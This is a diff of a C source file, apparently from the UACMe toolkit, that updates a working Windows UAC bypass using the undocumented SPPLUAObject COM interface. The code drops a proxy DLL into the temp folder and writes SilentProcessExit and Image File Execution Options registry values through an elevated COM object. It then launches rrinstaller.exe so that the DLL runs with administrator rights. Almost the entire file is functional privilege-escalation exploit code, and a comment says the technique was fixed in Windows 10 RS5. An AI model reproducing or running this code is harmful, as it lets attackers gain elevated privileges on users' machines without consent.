@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       DEROKO.C
 *
-*  VERSION:     2.89
+*  VERSION:     3.17
 *
-*  DATE:        14 June 2018
+*  DATE:        18 Mar 2019
 *
 *  Deroko UAC bypass using SPPLUAObject (Software Licensing).
 *  Origin https://github.com/deroko/SPPLUAObjectUacBypass
@@ -20,15 +20,15 @@
 #include "global.h"
 
 /*
-* ucmxxxRegSetValue
+* ucmSPLUAObjectRegSetValue
 *
 * Purpose:
 *
 * Write to the registry using elevated interface.
 *
 */
-HRESULT ucmxxxRegSetValue(
-    _In_ ISLLUACOM *pInterfaceObject,
+HRESULT ucmSPLUAObjectRegSetValue(
+    _In_ PVOID InterfaceObject,
     _In_ SSLUA_ROOTKEY RegType,
     _In_ LPWSTR KeyName,
     _In_ LPWSTR ValueName,
@@ -42,7 +42,8 @@ HRESULT ucmxxxRegSetValue(
     SAFEARRAY *psa;
     LPVOID     lpBuffer = NULL;
 
-    ISLLUACOMWin7 *pInterfaceObjectWin7 = (ISLLUACOMWin7*)pInterfaceObject;
+    ISLLUACOMWin7 *pInterfaceObjectWin7 = (ISLLUACOMWin7*)InterfaceObject;
+    ISLLUACOM *pInterfaceObject = (ISLLUACOM*)InterfaceObject;
 
     psa = SafeArrayCreateVector(VT_I1, 0, cbData);
     if (psa) {
@@ -54,7 +55,7 @@ HRESULT ucmxxxRegSetValue(
             bsRegistryValue = SysAllocString(ValueName);
             if (bsRegistryValue) {
 
-                if (g_ctx.dwBuildNumber < 9200) {
+                if (g_ctx->dwBuildNumber < 9200) {
                     r = pInterfaceObjectWin7->lpVtbl->SLLUARegKeySetValue(
                         pInterfaceObjectWin7,
                         RegType,
@@ -90,17 +91,17 @@ HRESULT ucmxxxRegSetValue(
 * Bypass UAC using SPPLUAObject undocumented COM interface.
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
+* Fixed in Windows 10 RS5.
+*
 */
-BOOL ucmSPPLUAObjectMethod(
+NTSTATUS ucmSPPLUAObjectMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL      bResult = FALSE, bCond = FALSE;
-    HRESULT   r = E_FAIL;
+    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT   r = E_FAIL, hr_init;
     ISLLUACOM *SPPLUAObject = NULL;
-    IID       xIID_ISPPLUA;
-    CLSID     xCLSID_ISPPLUA;
 
     DWORD     dwReportingMode = 1;
     DWORD     dwGlobalFlag = 0x200; //FLG_MONITOR_SILENT_PROCESS_EXIT
@@ -110,49 +111,44 @@ BOOL ucmSPPLUAObjectMethod(
     WCHAR     szBuffer[MAX_PATH * 2];
     LPWSTR    lpszCommandLine;
 
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
     do {
 
         //
         // Drop Fubuki to the %temp% as OskSupport.dll
         //
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, OSKSUPPORT_DLL);
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
 
-        if (CLSIDFromString(T_CLSID_SPPLUAObject, &xCLSID_ISPPLUA) != NOERROR) {
-            break;
-        }
-        if (IIDFromString(T_IID_SPPLUAObject, &xIID_ISPPLUA) != S_OK) {
-            break;
-        }
-
-        r = ucmMasqueradedCoGetObjectElevate(
+        r = ucmAllocateElevatedObject(
             T_CLSID_SPPLUAObject,
+            &IID_ISPPLUAObject,
             CLSCTX_LOCAL_SERVER,
-            &xIID_ISPPLUA,
             &SPPLUAObject);
 
         if (r != S_OK)
             break;
 
         if (SPPLUAObject == NULL) {
-            r = E_FAIL;
+            r = E_OUTOFMEMORY;
             break;
         }
 
         //
         // Build rundll32 command.
         //
-        memIO = (2 + _strlen(g_ctx.szSystemDirectory)\
+        memIO = (2 + _strlen(g_ctx->szSystemDirectory)\
             + _strlen(szBuffer)\
             + _strlen(RUNDLL_EXE_CMD)\
             + _strlen(FUBUKI_DEFAULT_ENTRYPOINTW)) * sizeof(WCHAR);
 
-        lpszCommandLine = supHeapAlloc(memIO);
+        lpszCommandLine = (LPWSTR)supHeapAlloc(memIO);
         if (lpszCommandLine) {
 
-            _strcpy(lpszCommandLine, g_ctx.szSystemDirectory);
+            _strcpy(lpszCommandLine, g_ctx->szSystemDirectory);
             _strcat(lpszCommandLine, RUNDLL_EXE_CMD);
             _strcat(lpszCommandLine, szBuffer);
             _strcat(lpszCommandLine, TEXT(","));
@@ -167,7 +163,8 @@ BOOL ucmSPPLUAObjectMethod(
             _strcat(szBuffer, RRINSTALLER_EXE);
 
             // 1. MonitorProcess
-            r = ucmxxxRegSetValue(SPPLUAObject,
+            r = ucmSPLUAObjectRegSetValue(
+                SPPLUAObject,
                 SSLUA_HKEY_LOCAL_MACHINE,
                 szBuffer,
                 T_MONITOR_PROCESS,
@@ -178,7 +175,8 @@ BOOL ucmSPPLUAObjectMethod(
             if (SUCCEEDED(r)) {
 
                 // 2. ReportingMode
-                r = ucmxxxRegSetValue(SPPLUAObject,
+                r = ucmSPLUAObjectRegSetValue(
+                    SPPLUAObject,
                     SSLUA_HKEY_LOCAL_MACHINE,
                     szBuffer,
                     T_REPORTING_MODE,
@@ -193,7 +191,8 @@ BOOL ucmSPPLUAObjectMethod(
                     _strcat(szBuffer, TEXT("\\"));
                     _strcat(szBuffer, RRINSTALLER_EXE);
 
-                    r = ucmxxxRegSetValue(SPPLUAObject,
+                    r = ucmSPLUAObjectRegSetValue(
+                        SPPLUAObject,
                         SSLUA_HKEY_LOCAL_MACHINE,
                         szBuffer,
                         T_GLOBAL_FLAG,
@@ -206,20 +205,24 @@ BOOL ucmSPPLUAObjectMethod(
                         //
                         // Launch trigger app.
                         //
-                        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+                        _strcpy(szBuffer, g_ctx->szSystemDirectory);
                         _strcat(szBuffer, RRINSTALLER_EXE);
-                        bResult = supRunProcess(szBuffer, NULL);
+                        if (supRunProcess(szBuffer, NULL))
+                            MethodResult = STATUS_SUCCESS;
                     }
                 }
             }
             supHeapFree(lpszCommandLine);
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     if (SPPLUAObject != NULL) {
         SPPLUAObject->lpVtbl->Release(SPPLUAObject);
     }
 
-    return bResult;
+    if (hr_init == S_OK)
+        CoUninitialize();
+
+    return MethodResult;
 }
